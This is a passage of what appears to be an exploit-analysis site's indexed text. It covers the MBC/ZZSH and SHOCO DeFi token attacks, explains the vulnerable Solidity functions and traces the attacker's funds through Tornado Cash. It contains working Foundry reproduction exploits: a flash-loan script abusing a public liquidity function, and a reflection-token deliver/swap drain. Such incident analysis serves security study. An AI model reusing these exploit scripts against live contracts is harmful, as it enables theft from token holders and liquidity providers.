attacker exchanged MBC tokens back for about 155k USDT, resulting in a profit of around 5k USDT (14, 15). </p> <p>During this period, USDT and MBC tokens are transferred to the pair from the MBC contract (7, 8), and LP tokens are minted (9, 10), indicating that the previous token transfer was to add liquidity to the pool. (The two addresses where LP tokens are minted are <code>feeTo</code> in the factory and <code>tokenOwner</code> in the MBC token)</p> <p></p> <p>Finally, the attacker used MBC tokens to exchange for USDT in the pool (14, 15), obtaining approximately 155k USDT.</p> <p>A similar logic applies to the ZZSH token, resulting in a net profit of approximately 5.9k USDT.</p> <p>The root cause of this attack seems to be that both the MBC and ZZSH token contracts themselves held a certain amount of tokens (USDT, MBC, and ZZSH). Additionally, there was an external function with access control flaws that allowed anyone to call the contract to help the <code>tokenOwner</code> add liquidity to the pool.</p>"},{"location":"2022/221129_MBC/#balance-changes","title":"Balance Changes","text":"<p>From the balance changes, it appears that the two token contracts affected by the vulnerability collectively lost approximately 10k USDT (the increase in the quantity of the MBC/ZZSH tokens owned by the contract is likely due to swap fees). In the end, the attacker transferred all the 5.9k USDT in profit to another address.</p>"},{"location":"2022/221129_MBC/#state-changes","title":"State Changes","text":"<p>Because the attacker used token contract funds to add liquidity, the PancakeSwap pool's <code>totalSupply</code> increased.</p>"},{"location":"2022/221129_MBC/#invocation-flow","title":"Invocation Flow","text":"<p>Now let's analyze the internal call details of the transaction.</p> <p></p> <p>The outermost layer is a DODO protocol flash loan, where funds are borrowed for the subsequent attack.</p> <p></p> <p>Next, there are operations related to the MBC token, involving transferring 150k USDT to the MBC-USDT pool, then calling the <code>swap</code> function to exchange for MBC tokens. Afterward, the MBC token contract's <code>swapAndLiquifyStepV1</code> function is called, and after a <code>sync</code>, a small amount of USDT (1001/10**18) is transferred to the pool, followed by transferring MBC back to the pool and performing another <code>swap</code>. The vulnerable function here is clearly <code>swapAndLiquifyStepV1</code>, as it performs the liquidity addition operation mentioned earlier.</p> <p></p> <p>It can be observed that this function then calls the PancakeRouter's <code>addLiquidity</code> function to add liquidity, uses the <code>transferFrom</code> function to make the MBC contract transfer tokens to the pool, and finally, mints LP tokens for <code>tokenOwner</code>. Moreover, it automatically performs a <code>sync</code>, so the attacker doesn't need to manually <code>sync</code>.</p> <p></p> <p>The ZZSH token follows the same calling process.</p> <p></p> <p>Finally, the loan is repaid, and the profits are transferred.</p>"},{"location":"2022/221129_MBC/#vulnerability","title":"Vulnerability","text":"<p>Now let's analyze the vulnerability in the MBC contract.</p> <p>From the analysis of the attack transaction, we can see that the vulnerability lies in the <code>swapAndLiquifyStepV1</code> function of the contract.</p> <pre><code>function swapAndLiquifyStepv1() public {\n    uint256 ethBalance = ETH.balanceOf(address(this));\n    uint256 tokenBalance = balanceOf(address(this));\n    addLiquidityUsdt(tokenBalance, ethBalance);\n}\n</code></pre> <p>This function first retrieves the contract's USDT and MBC token balances, then calls the <code>addLiquidityUsdt</code> function with these balances as parameters.</p> <pre><code>function addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {\n    uniswapV2Router.addLiquidity(\n        address(_baseToken),\n        address(this),\n        usdtAmount,\n        tokenAmount,\n        0,\n        0,\n        _tokenOwner,\n        block.timestamp\n    );\n}\n</code></pre> <p>The <code>addLiquidityUsdt</code> function directly calls the Router's <code>addLiquidity</code> function, using all of the contract's balances as parameters to add liquidity for the <code>tokenOwner</code>. It's evident that <code>swapAndLiquifyStepV1</code> is merely a wrapper for the <code>addLiquidity</code> function, allowing the contract's balance to be used for liquidity addition. This functionality should have been a <code>private</code> function, but it's mistakenly declared as <code>public</code>, enabling attackers to use the contract's balance to add liquidity. (Moreover, based on the attack transaction, it seems that no actual swapping occurred, and liquidity was added directly.) </p> <p>The ZZSH contract has identical code to the MBC contract.</p>"},{"location":"2022/221129_MBC/#exploit","title":"Exploit","text":""},{"location":"2022/221129_MBC/#reproduce","title":"Reproduce","text":"<p>To reproduce the exploit based on the AttackTx, follow the steps below.</p> <pre><code>function testExploit() external {\n    uint attackBlockNumber = 23474460;\n    cheats.rollFork(attackBlockNumber);\n\n    uint startBalance = usdt.balanceOf(address(this));\n    emit log_named_decimal_uint(\"Initial attacker USDT\", startBalance, usdt.decimals());\n    uint dodoUSDT = usdt.balanceOf(dodo);\n    // Start flashloan\n    DPPOracle(dodo).flashLoan(0, dodoUSDT, address(this), abi.encode(\"dodo\"));\n\n    // Attack ends\n    uint endBalance = usdt.balanceOf(address(this));\n    emit log_named_decimal_uint(\"Total profit USDT\", endBalance - startBalance, usdt.decimals());\n}\n\nfunction dodoCall(address /*sender*/, uint256 /*baseAmount*/, uint256 quoteAmount, bytes calldata /*data*/) internal {\n    if (msg.sender == dodo) {\n        emit log_named_decimal_uint(\"Total borrowed USDT\", usdt.balanceOf(address(this)), usdt.decimals());\n\n        // Approve before swap\n        usdt.approve(address(pancakeRouter), type(uint).max);\n        mbc.approve(address(pancakeRouter), type(uint).max);\n        zzsh.approve(address(pancakeRouter), type(uint).max);\n\n        attack();\n\n        // Repay flashloan\n        usdt.transfer(dodo, quoteAmount);\n    }\n}\n\nfunction attack() internal {\n    USDT2VulToken(mbc_usdt);\n\n    mbc.swapAndLiquifyStepv1();\n    // mbc_usdt.sync(); // unnecessary\n\n    usdt.transfer(address(mbc_usdt), 1001);  // According to _isAddLiquidityV1 function when calling _transfer, to avoid executing swapAndLiquify function\n    VulToken2USDT(mbc_usdt);\n\n    // zzsh\n    USDT2VulToken(zzsh_usdt);\n    zzsh.swapAndLiquifyStepv1();\n    usdt.transfer(address(zzsh_usdt), 1001);\n    VulToken2USDT(zzsh_usdt);\n}\n\nfunction DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n    dodoCall(sender, baseAmount, quoteAmount, data);\n}\n\nfunction USDT2VulToken(PancakePair target) internal {\n    // Swap 150k USDT to MBC/ZZSH\n    usdt.transfer(address(target), 150_000 ether);\n    (uint reserve0, uint reserve1, ) = target.getReserves();\n    uint amountOut = 0;\n    if (target.token0() != address(usdt)) {\n        amountOut  = pancakeRouter.getAmountOut(150_000 ether, reserve1, reserve0);\n        target.swap(amountOut, 0, address(this), \"\");\n        emit log_named_decimal_uint(\"Total exchanged vulnerable token\", ERC20(target.token0()).balanceOf(address(this)), mbc.decimals());\n    } else {\n        amountOut  = pancakeRouter.getAmountOut(150_000 ether, reserve0, reserve1);\n        target.swap(0, amountOut, address(this), \"\");\n        emit log_named_decimal_uint(\"Total exchanged vulnerable token\", ERC20(target.token1()).balanceOf(address(this)), mbc.decimals());\n    }\n}\n\nfunction VulToken2USDT(PancakePair target) internal {\n    // Swap MBC/ZZSH to USDT\n    (uint reserve0, uint reserve1, ) = target.getReserves();\n    uint usdtAmountout = 0;\n    if (target.token0() != address(usdt)) {\n        ERC20 token = ERC20(target.token0());\n        token.transfer(address(target), token.balanceOf(address(this)));\n        uint amountIn = token.balanceOf(address(target)) - reserve0;\n        usdtAmountout  = pancakeRouter.getAmountOut(amountIn, reserve0, reserve1);\n        target.swap(0, usdtAmountout, address(this), \"\");\n    } else {\n        ERC20 token = ERC20(target.token1());\n        token.transfer(address(target), token.balanceOf(address(this)));\n        uint amountIn = token.balanceOf(address(target)) - reserve1;\n        usdtAmountout  = pancakeRouter.getAmountOut(amountIn, reserve1, reserve0);\n        target.swap(usdtAmountout, 0, address(this), \"\");\n    }\n    emit log_named_decimal_uint(\"Total exchanged USDT token\", usdtAmountout, usdt.decimals());\n}\n</code></pre> <p>First, initiate a flashloan from the DoDo pool with a large amount of USDT. In the callback function <code>dodoCall</code>, approve token transfers, execute the <code>attack</code> function, and repay the flashloan. The <code>attack</code> function involves swapping USDT to target tokens, adding liquidity to the pool by <code>swapAndLiquifyStepv1</code>, and then swapping back to USDT. This process results in a profit of approximately 5.9k USDT.</p> <p>One peculiar aspect when analyzing the attack transaction is the need to transfer 1001/10^18 USDT to the pool when swapping back to USDT. This relates to the token transfer implementation.</p> <p>When swapping tokens, the attacker transfers target tokens to the pool in exchange for USDT. This involves the following transfer function:</p> <pre><code>function _transfer(\n    address from,\n    address to,\n    uint256 amount\n) internal override {\n    require(from != address(0) &amp;&amp; !_isExcludedFromVip[from], \"ERC20: transfer from the zero address\");\n    require(to != address(0), \"ERC20: transfer to the zero address\");\n    require(amount&gt;0);\n\n    if(_isExcludedFromVipFees[from] || _isExcludedFromVipFees[to]){\n        super._transfer(from, to, amount);\n        return;\n    }\n\n    bool isAddLdx;\n    if(to == uniswapV2Pair){\n        isAddLdx = _isAddLiquidityV1();\n    }\n\n    if(balanceOf(address(this)) &gt; swapTokensAtAmount){\n        if (\n            !swapping &amp;&amp;\n            _tokenOwner != from &amp;&amp;\n            _tokenOwner != to &amp;&amp;\n            from != uniswapV2Pair &amp;&amp;\n            swapAndLiquifyEnabled &amp;&amp;\n            !isAddLdx\n        ) {\n            swapping = true;\n            swapAndLiquify();\n            swapping = false;\n        }\n    }\n\n    bool takeFee = !swapping;\n    if (_isExcludedFromFees[from] || _isExcludedFromFees[to] || _destroyMax &lt;= balanceOf(_destroyAddress)) {\n        takeFee = false;\n    }else{\n        if(from == uniswapV2Pair){\n            require(swapBuyStats);\n        }else if(to == uniswapV2Pair){\n            require(swapSellStats);\n            if(balanceOf(from) == amount){\n                amount = amount.div(10000).mul(9999);\n            }\n        }else{\n            takeFee = false;\n        }\n    }\n\n    if (takeFee) {\n        super._transfer(from, _destroyAddress, amount.div(100).mul(deadRate));\n        super._transfer(from, address(this), amount.div(100).mul(ldxRate));\n        super._transfer(from, _fundAddress, amount.div(100).mul(fundRate));\n        amount = amount.div(100).mul(100 - fundRate - deadRate - ldxRate);\n    }\n    super._transfer(from, to, amount);\n}\n</code></pre> <p>This code contains fee calculations. Notably, fees are transferred to the token contract, which is why the token contract holds a balance of the token.</p> <pre><code>bool isAddLdx;\nif(to == uniswapV2Pair){\n    isAddLdx = _isAddLiquidityV1();\n}\n\nif(balanceOf(address(this)) &gt; swapTokensAtAmount){\n    if (\n        !swapping &amp;&amp;\n        _tokenOwner != from &amp;&amp;\n        _tokenOwner != to &amp;&amp;\n        from != uniswapV2Pair &amp;&amp;\n        swapAndLiquifyEnabled &amp;&amp;\n        !isAddLdx\n    ) {\n        swapping = true;\n        swapAndLiquify();\n        swapping = false;\n    }\n}\n</code></pre> <p>From a logical perspective, the above part of the code first checks whether it is the target token transfer to the pool. If it is, the <code>_isAddLiquidityV1</code> function is called.</p> <pre><code>function _isAddLiquidityV1()internal view returns(bool ldxAdd){\n    address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();\n    address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();\n    (uint r0,uint r1,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();\n    uint bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));\n    uint bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));\n    if( token0 == address(this) ){\n        if( bal1 &gt; r1){\n            uint change1 = bal1 - r1;\n            ldxAdd = change1 &gt; 1000;\n        }\n    }else{\n        if( bal0 &gt; r0){\n            uint change0 = bal0 - r0;\n            ldxAdd = change0 &gt; 1000;\n        }\n    }\n}\n</code></pre> <p>This function checks the <code>balance</code> and <code>reserve</code> of the current pool. If the quantity of the other token in the pool (in this case, USDT) increases and exceeds 1,000, it returns <code>true</code>.</p> <p>Since the validation <code>to == uniswapV2Pair</code> earlier, it indicates that tokens are being added to the pool. Therefore, here, it checks whether the quantity of the other token in the pool has increased to determine if it's a liquidity addition operation.</p> <pre><code>if(balanceOf(address(this)) &gt; swapTokensAtAmount){\n    if (\n        !swapping &amp;&amp;\n        _tokenOwner != from &amp;&amp;\n        _tokenOwner != to &amp;&amp;\n        from != uniswapV2Pair &amp;&amp;\n        swapAndLiquifyEnabled &amp;&amp;\n        !isAddLdx\n    ) {\n        swapping = true;\n        swapAndLiquify();\n        swapping = false;\n    }\n}\n</code></pre> <p>Afterward, the contract will check if the balance is greater than a threshold value. If it is, and it is not a liquidity addition scenario (along with some other checks), the <code>swapAndLiquify</code> function will be invoked.</p> <pre><code>function swapAndLiquify() public {\n    uint256 allAmount = balanceOf(address(this));\n    if(allAmount &gt; 10**18){\n        uint256 canswap = allAmount.div(2);\n        uint256 otherAmount = allAmount.sub(canswap);\n        swapTokensForOther(canswap);\n        uint256 ethBalance = ETH.balanceOf(address(this));\n        addLiquidityUsdt(ethBalance, otherAmount);\n    }\n}\n</code></pre> <p>This function checks the contract balance and uses half of the token balance as parameter to call <code>swapTokensForOther</code>.</p> <pre><code>function swapTokensForOther(uint256 tokenAmount) public {\n    address[] memory path = new address[](2);\n    path[0] = address(this);\n    path[1] = address(_baseToken);\n    uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        tokenAmount,\n        0,\n        path,\n        address(warp),\n        block.timestamp\n    );\n    warp.withdraw();\n}\n</code></pre> <p>Actually, it swaps half of the contract's token to USDT. Then, it uses the remaining token along with the converted USDT to call <code>addLiquidityUsdt</code> and add liquidity for the <code>tokenOwner</code>. Since adding liquidity calculates the input amounts based on the actual reserves in the pool, it may leave some USDT in the contract, which is why the contract holds USDT.</p> <p>Overall, this vulnerable token is designed with the following logic: during token transfer, if it's not transferring out of the pool (i.e., exchanging USDT for contract tokens), doesn't involve <code>tokenOwner</code>, and the <code>_isAddLiquidityV1</code> function confirms it's not adding liquidity, then the <code>swapAndLiquify</code> function is executed. This function converts half of the contract's tokens into USDT and adds liquidity for <code>tokenOwner</code>.</p> <p>Therefore, for the attacker to exploit, they need to avoid executing <code>swapAndLiquify</code>. Otherwise, if the contract executes <code>swap</code> beforehand, it would lower the price of tokens during the attacker's exchange, rendering them unable to profit. Simply by transferring USDT before transferring (swap) target tokens, making it appear as liquidity addition, can circumvent this situation. According to the code logic, a minimum transfer of 1001 would suffice.</p> <p>(However, this design seems to result in higher slippage for regular users selling the tokens when the contract balance exceeds a certain threshold, akin to someone frontrunning and selling ahead.)</p>"},{"location":"2022/221129_MBC/#attack-flow","title":"Attack Flow","text":"<p>Analyzing the entire attack flow from the attacker's address:</p> <p></p> <p>First, on November 28th, at approximately 4:09 PM, the attacker deposited 1 BNB into Tornado Cash for initial attack funds.</p> <p></p> <p>The next day, at 1:00 PM, the attacker created a contract (profitContract) for receiving the profits and another contract (attackContract) for the attack. The attacker then called the attack contract to initiate the attack. These transactions occurred in consecutive blocks, indicating that the attacker rapidly executed these transactions directly within a script.</p> <p></p> <p>Two days later, on the afternoon of December 1st, at 2 PM, the attacker created another contract and invoked the <code>0xdbce5f1e</code> function.</p> <p>Analyzing this transaction, it becomes evident that this was yet another attack involving the MbeEcology token.</p> <p>The vulnerability, once again, dues to the access control. This token has the following two <code>public</code> functions.</p> <pre><code>function swapTokensForEth(\n    address routerAddress,\n    uint256 tokenAmount\n) public  {\n    IRouter pancakeRouter = IRouter(routerAddress);\n\n    // generate the pancake pair path of token -&gt; weth\n    address[] memory path = new address[](2);\n    path[0] = address(this);\n    path[1] = pancakeRouter.WETH();\n\n    // make the swap\n    pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\n        tokenAmount,\n        0, // accept any amount of BNB\n        path,\n        address(this),\n        block.timestamp\n    );\n}\nfunction addLiquidity(\n    address routerAddress,\n    address owner,\n    uint256 tokenAmount,\n    uint256 ethAmount\n) public {\n    IRouter pancakeRouter = IRouter(routerAddress);\n\n    // add the liquidity\n    pancakeRouter.addLiquidityETH{value : ethAmount}(\n        address(this),\n        tokenAmount,\n        0, // slippage is unavoidable\n        0, // slippage is unavoidable\n        owner,\n        block.timestamp + 360\n    );\n}\n</code></pre> <p>The logic behind the <code>swapTokensForEth</code> function is to exchange the contract's tokens for BNB, while <code>addLiquidity</code> is used to add liquidity for the <code>owner</code> using the contract's balance (similar to the earlier MBC and ZZSH tokens). Clearly, both of these functions should not be marked as <code>public</code>. What makes this more severe than the other two tokens is that the address of the <code>router</code> can be arbitrarily set, allowing the creation of malicious contracts (as shown in the attacker's third contract), which can use the same function signature to implement malicious logic.</p> <p>The attacker exploited this vulnerability by first exchanging all the tokens in the contract for BNB using the <code>swapTokensForEth</code> function. Subsequently, they used the malicious contract as the <code>router</code> and called the <code>addLiquidity</code> function, but did not implement the liquidity addition functionality. Instead, they simply transferred out all the BNB balance (<code>{value: ethAmount}</code>), ultimately gaining approximately 0.6 BNB.</p> <p></p> <p>Three days later, on December 4th, the attacker withdrew all the profits obtained from the attack through the <code>profitContract</code>. After converting USDT to BNB, they used Tornado Cash to further anonymize their funds and complete the exit.</p>"},{"location":"2022/221129_MBC/#misc","title":"Misc","text":""},{"location":"2022/221129_MBC/#reason-for-profit","title":"Reason For Profit","text":"<p>One obvious question arises: why was the attacker able to receive more USDT than initially invested after providing liquidity, even though two swaps incurred layers of fees?</p> <p>According to Uniswap's economic model, as illustrated in the following diagram:</p> <p></p> <p>When the input token quantity <code>dy</code> is smaller relative to the reserve values <code>x</code> and <code>y</code> of the two tokens in the pool, the output token quantity <code>dx</code> is closer to the ratio of the reserves. Therefore, if liquidity increases, one can exchange tokens at a better price and get more tokens.</p> <p>In the above scenario, the reserve values of the two tokens are 100,000 and 20 respectively (ETH:DAI = 1:5000), which can be simply understood as 1 ETH being worth 5000 DAI. Without considering fees, 1 ETH can be exchanged for about 4761 DAI (1:4761). However, if you use 5 ETH for the exchange, you can only get 20,000 DAI (1:4000).</p> <p>If at this point, the reserve values of the two tokens are 200,000 and 40 respectively (ETH:DAI = 1:5000), with the relative value being the same as before but with more liquidity, without considering fees, 1 ETH can be exchanged for about 4878 DAI (1:4878). If you use 5 ETH for the exchange, you can get 22,222 DAI (1:4444).</p> <p>Obviously, the higher the pool's liquidity (the more sufficient the reserves of the two tokens), the better the price one can get when exchanging, closer to the reserve ratio, and the more tokens one can get. This is why the attacker can get more USDT by first using a vulnerable contract to add liquidity and then exchange tokens.</p>"},{"location":"2022/221129_MBC/#loss","title":"Loss","text":"<p>Another question is how much loss the victim (the vulnerable token contract / tokenOwner) suffered in this attack. In other words, the tokens were added to the pool as liquidity, and <code>tokenOwner</code> received LP tokens, so why was there still a loss? (If there was no loss, the attacker could have simply added liquidity with their own funds.)</p> <p>Continuing with the previous example, in a pool with reserve values of 100,000 and 20 (ETH:DAI = 1:5000), a regular user added 10,000 DAI and 2 ETH to the pool, representing 10% of the liquidity. At that time, the value was calculated as 20,000 DAI. If another user sells 10 ETH into the pool, they would receive approximately 33,333 DAI. The pool would then contain 66,667 DAI and 30 ETH (ETH:DAI = 1:2,222). For the liquidity provider, their 10% share would now be worth only 13,333 DAI, which is a loss compared to the initial value without providing liquidity (10,000 DAI + 2 ETH = 14,444 DAI). This loss is known as impermanent loss.</p> <p>It's important to note that the measurement and perception of impermanent loss depend on the chosen reference (base). Typically, stablecoins (such as the USDT obtained by the attacker and the DAI in the example above) are used as the reference, and what is concerned is how the asset value relative to this stablecoin changes. In the example, DAI is the reference, and it experienced impermanent loss. However, if ETH were the reference, the liquidity share would be equivalent to having 6 ETH, which is an increase compared to the initial value without providing liquidity (10,000 DAI + 2 ETH = 4 ETH).</p> <p>In this attack, the <code>tokenOwner</code> added liquidity when the contract token's value was high. Subsequently, due to the attacker's swaps, the contract token's quantity increased, causing the price to drop. When viewed with USDT as the reference, impermanent loss became evident.</p>"},{"location":"2022/221129_MBC/#bugs","title":"Bugs","text":"<p>During the analysis, it appears that several other bugs exist in the token contract's design.</p> <pre><code>function testAddLiquidity() external {\n    address test = 0x1234123412341234123412341234123412341234;\n    deal(address(usdt), test, 10000 ether);\n    deal(address(mbc), test, 1000 ether);\n    cheats.startPrank(test);\n    usdt.approve(address(pancakeRouter), type(uint).max);\n    mbc.approve(address(pancakeRouter), type(uint).max);\n\n    emit log_named_decimal_uint(\"Initial mbc balance in the pool\", mbc.balanceOf(address(mbc_usdt)), mbc.decimals());\n    emit log_named_decimal_uint(\"Initial usdt balance in the pool\", usdt.balanceOf(address(mbc_usdt)), usdt.decimals());\n    (uint reserve0, uint reserve1, ) = mbc_usdt.getReserves();\n    emit log_named_decimal_uint(\"Initial mbc price\", pancakeRouter.quote(1 ether, reserve0, reserve1), usdt.decimals());\n    console.log(mbc.balanceOf(address(mbc))/1 ether);\n    pancakeRouter.addLiquidity(address(usdt), address(mbc), usdt.balanceOf(test), mbc.balanceOf(test), 0,0, test, block.timestamp);\n    // pancakeRouter.addLiquidity(address(mbc), address(usdt), mbc.balanceOf(test), usdt.balanceOf(test), 0,0, test, block.timestamp);\n\n    emit log_named_decimal_uint(\"Eventually mbc balance in the pool\", mbc.balanceOf(address(mbc_usdt)), mbc.decimals());\n    emit log_named_decimal_uint(\"Eventually usdt balance in the pool\", usdt.balanceOf(address(mbc_usdt)), usdt.decimals());\n    (uint reserve00, uint reserve11, ) = mbc_usdt.getReserves();\n    emit log_named_decimal_uint(\"Eventually mbc price\", pancakeRouter.quote(1 ether, reserve00, reserve11), usdt.decimals());\n\n    cheats.stopPrank();\n}\n</code></pre> <p>In the above test code for adding liquidity, if the <code>addLiquidity</code> function receives <code>usdt</code> as the first parameter and <code>mbc</code> as the second parameter, liquidity can be added without errors, and the relative token prices obtained via the <code>quote</code> function remain largely unchanged.</p> <p>However, if the parameters are reversed, with <code>mbc</code> first and <code>usdt</code> second, the code should function identically according to the router's implementation, but it results in an error.</p> <p>Analysis reveals several issues with the token contract:</p> <p>Firstly, the reason for the error:</p> <pre><code>function swapAndLiquify() public {\n    uint256 allAmount = balanceOf(address(this));\n    if(allAmount &gt; 10**18){\n        uint256 canswap = allAmount.div(2);\n        uint256 otherAmount = allAmount.sub(canswap);\n        swapTokensForOther(canswap);\n        uint256 ethBalance = ETH.balanceOf(address(this));\n        addLiquidityUsdt(ethBalance, otherAmount);\n    }\n}\n\nfunction addLiquidityUsdt(uint256 tokenAmount, uint256 usdtAmount) private {\n    uniswapV2Router.addLiquidity(\n        address(_baseToken),\n        address(this),\n        usdtAmount,\n        tokenAmount,\n        0,\n        0,\n        _tokenOwner,\n        block.timestamp\n    );\n}\n</code></pre> <p>When adding liquidity with <code>mbc</code> first and <code>usdt</code> second, it triggers the <code>swapAndLiquify</code> function. As previously discussed, this function involves selling the contract's tokens for USDT and then adding liquidity. The issue arises because the parameter order is incorrect: <code>addLiquidityUsdt</code> expects the contract's token quantity first and then the USDT quantity. However, when calling <code>swapAndLiquify</code>, the parameters are passed in reverse order, leading to the error in the test code.</p> <p>As for why adding liquidity with <code>usdt</code> first and <code>mbc</code> second doesn't result in an error, it's due to a flaw in the <code>_isAddLiquidityV1</code> function's logic:</p> <pre><code>function _isAddLiquidityV1() internal view returns(bool ldxAdd){\n    address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();\n    address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();\n    (uint r0,uint r1,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();\n    uint bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));\n    uint bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));\n    if( token0 == address(this) ){\n        if( bal1 &gt; r1){\n            uint change1 = bal1 - r1;\n            ldxAdd = change1 &gt; 1000;\n        }\n    }else{\n        if( bal0 &gt; r0){\n            uint change0 = bal0 - r0;\n            ldxAdd = change0 &gt; 1000;\n        }\n    }\n}\n</code></pre> <p>As mentioned earlier, this function checks whether the current <code>_transfer</code> operation is part of adding liquidity. If it isn't, the contract's tokens are exchanged and liquidity is added. The problem arises because when adding liquidity with <code>usdt</code> first and <code>mbc</code> second, it is detected by the <code>_isAddLiquidityV1</code> function, so the <code>swapAndLiquify</code> function isn't executed. However, when adding liquidity with <code>mbc</code> first and <code>usdt</code> second, the router first transfers the <code>mbc</code> tokens, and at this point, <code>usdt</code> hasn't been added to the pool yet. As a result, the <code>_isAddLiquidityV1</code> function doesn't detect a change in the pool's <code>usdt</code> balance, leading to the assumption that liquidity isn't being added. This causes the <code>swapAndLiquify</code> function to execute. This behavior can result in inconsistencies between user expectations and actual outcomes when ordinary users add liquidity, as seen in the test code.</p> <p>Additionally, it's worth noting that making both the <code>swapAndLiquify</code> and <code>swapTokensForOther</code> functions <code>public</code> is also a vulnerability.</p>"},{"location":"2022/221129_MBC/#frontrunning-protection","title":"Frontrunning Protection","text":"<p>Upon decompilation of the attack contract, it appears that the code mainly relies on relatively simple require validation statements.</p> <p>However, as analyzed earlier, the attacker did not directly retain profits in the attackContract or send them to their address in the attack transactions. Instead, they transferred the profits to a pre-existing contract, which served as temporary storage for attack income, and later withdraw it all at once. This tactic was used to prevent their gains from becoming too conspicuous and potentially attracting the attention of bots. However, the effectiveness of this approach may be limited.</p>"},{"location":"2022/221129_MBC/#reference","title":"Reference","text":"<p>A Deep Dive Into the Uniswap V2 Protocol</p>"},{"location":"2023/230119_SHOCO/","title":"230119-SHICO","text":"<p>Analyzing the TINU attack incident, it was found that the attacker also attempted a similar attack vector against the SHOCO token, but was frontrun. Below is a brief analysis of this attack.</p>"},{"location":"2023/230119_SHOCO/#attacktx","title":"AttackTx","text":"<p>A simple analysis of the bot's AttackTx and the original attackContract reveals that this attack is similar to TINU, except the attacker used a more complex <code>skim-&gt;deliver</code> call chain.</p> <p></p> <p>It is worth mentioning that the original attacker did not use Flashbots' privacy service to send the attack, and the code only verified <code>msg.sender</code>, which made the transaction initiated vulnerable to frontrunning.</p> <p></p> <p>The bot, however, used Flashbots to initiate the transaction, bribing the Builder with 0.09 Ether and ultimately profiting approximately 4.067 Ether.</p> <p></p> <p>After the attack, <code>rTotal</code> decreased, and <code>tFeeTotal</code> increased, indicating that the vulnerability should be consistent with TINU.</p>"},{"location":"2023/230119_SHOCO/#vulnerability","title":"Vulnerability","text":"<p>Test SHOCO using the following code.</p> <pre><code>function testExcludePair() external {\n    uint attackBlockNumber = 16440978;\n    vm.rollFork(attackBlockNumber);\n    console2.log(\"exclude pair?\", shoco.isExcluded(address(shoco_weth)));\n    // false\n}\n\nfunction testCondition() external {\n    uint attackBlockNumber = 16440978;\n    vm.rollFork(attackBlockNumber);\n\n    uint256 rTotal = uint256(vm.load(address(shoco), bytes32(uint256(14))));\n    uint256 rExcluded = getMappingValue(address(shoco), 3, address(0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a));\n    uint256 tExcluded = getMappingValue(address(shoco), 4, address(0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a));\n    uint256 rPair = getMappingValue(address(shoco), 3, address(shoco_weth));\n\n    emit log_named_uint(\"SHOCO rTotal\", rTotal);       // 92755547632244760386804193176548296809462337522816469006214886422157380388136\n    emit log_named_uint(\"SHOCO rExcluded\", rExcluded);  // 8156838275115295013986843616955720757118132673218460444629959325168666253906\n    emit log_named_uint(\"SHOCO tExcluded\", tExcluded);  // 87404117343064238256026\n    emit log_named_uint(\"Pair rOwned\", rPair); // 92466134384845745906067152367297685498563381326034118259801712787064725855887\n    console2.log(\"rPair &gt; rSupply?\", rPair &gt; rTotal-rExcluded); // true\n}\n</code></pre> <p>It can be observed that it is identical to the vulnerability in TINU, i.e., failure to exclude the pair and increasing <code>rOwned</code> out of thin air, meeting the conditions for attack. Code comparison also verifies that SHOCO's code follows the same logic as TINU.</p>"},{"location":"2023/230119_SHOCO/#exploit","title":"Exploit","text":"<p>Therefore, a similar script can be directly used to launch the attack.</p> <pre><code>function testExploit() external {\n    uint attackBlockNumber = 16440978;\n    vm.rollFork(attackBlockNumber);\n    emit log_named_decimal_uint(\"WETH balance\", weth.balanceOf(address(shoco_weth)), weth.decimals());\n    deal(address(weth), address(this), 2000 ether);\n\n    uint256 rTotal = uint256(vm.load(address(shoco), bytes32(uint256(14))));\n    uint256 rExcluded = getMappingValue(address(shoco), 3, address(0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a));\n    uint256 rAmountOut = rTotal-rExcluded;\n    uint256 shocoAmountOut = shoco.tokenFromReflection(rAmountOut) - 0.1*10**9;\n\n    (uint reserve0, uint reserve1, ) = shoco_weth.getReserves();\n    uint256 wethAmountIn = getAmountIn(shocoAmountOut, reserve1, reserve0);\n    emit log_named_decimal_uint(\"WETH amountIn\", wethAmountIn, weth.decimals());\n    weth.transfer(address(shoco_weth), wethAmountIn);\n\n    shoco_weth.swap(\n        shocoAmountOut,\n        0, \n        address(this),\n        \"\"\n    );\n\n    shoco.deliver(shoco.balanceOf(address(this))*99999/100000);\n\n    (reserve0, reserve1, ) = shoco_weth.getReserves();\n    uint256 wethAmountOut = getAmountOut(shoco.balanceOf(address(shoco_weth))-reserve0, reserve0, reserve1);\n    shoco_weth.swap(0, wethAmountOut, address(this), \"\");\n    if (wethAmountIn &lt; wethAmountOut) {\n        emit log_named_decimal_uint(\"Attack profit:\", wethAmountOut - wethAmountIn, weth.decimals());\n    } else {\n        emit log_named_decimal_uint(\"Attack loss:\", wethAmountIn - wethAmountOut, weth.decimals());\n    }\n}\n\nfunction testSwap() external {\n    uint attackBlockNumber = 16440978;\n    vm.rollFork(attackBlockNumber);\n    uint256 rTotal = uint256(vm.load(address(shoco), bytes32(uint256(14))));\n    uint256 rExcluded = getMappingValue(address(shoco), 3, address(0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a));\n    uint256 shocoDeliver = shoco.tokenFromReflection(rTotal-rExcluded)-0.1*10**9;\n\n    // uint256 amountOut = 1 ether;\n    uint256 amountOut = 4.3 ether;\n    shoco_weth.swap(shocoDeliver, amountOut, address(this), \"1\");\n    emit log_named_decimal_uint(\"WETH balance\", weth.balanceOf(address(this)), weth.decimals());\n}\n\nfunction uniswapV2Call(address /*sender*/, uint /*amount0*/, uint /*amount1*/, bytes calldata /*data*/) external {\n    shoco.deliver(shoco.balanceOf(address(this))*99999/100000);\n}\n</code></pre> <p>The only difference is that burning all tokens obtained from <code>swap</code> here would cause the pair's balance to 